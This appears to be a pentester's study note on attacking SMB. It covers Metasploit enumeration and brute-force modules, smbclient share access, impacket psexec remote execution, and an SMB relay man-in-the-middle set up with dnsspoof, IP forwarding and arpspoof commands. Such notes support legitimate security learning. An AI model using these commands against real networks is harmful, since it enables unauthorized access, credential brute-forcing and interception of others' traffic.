SMB is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computer on a local network, SAMBA is the linux equivalent 
# Details
- default port is 445
- uses tcp
## SMB authentication
The SMB protocol utilises two levels of authentication
- User authentication: the user must provide a username and password in order to authenticate with the SMB server and access a share
- Share authentication: the user must provide a password in order to access restricted shares
both utilize a challenge response authentication system
# Enumeration
## MSF auxiliary/scanner/smb/smb_version
finds the smb version running
## MSF auxiliary/scanner/smb/smb_enumusers
finds all users on the smb program
## MSF auxiliary/scanner/smb/smb_enumshares
gets all shares on the smb program
## MSF auxiliary/scanner/smb/smb_login
brute forces smb login
# Logging on
lists shares
```shell
smbclient -L \\\\ip\\ -U admin
```

logging into a share
```shell
smbclient \\\\ip\\share -U admin
```
# PsExec
PsExec allows you to execute commands on a target system via authenticating using smb
https://github.com/veso266/impacket/blob/master/examples/psexec.py
```shell
psexec.py user@ip cmd.exe
```
# SMB relay
the `smb_relay` metasploit module allows you to perform a relay attack on a smb server, which is a mitm attack on a target system
using dnsspoof to spoof the dns record of a legitimate server to refer to you

```shell
echo "ip *.domain" > dns
dnsspoof -i interface -f dns
```
then you need to do ip forwarding
```shell
echo 1 > /proc/sys/net/ipv4/ip forward
```
then you need to do arp spoofing
```shell
arpspoof -i interface -t gateway target
```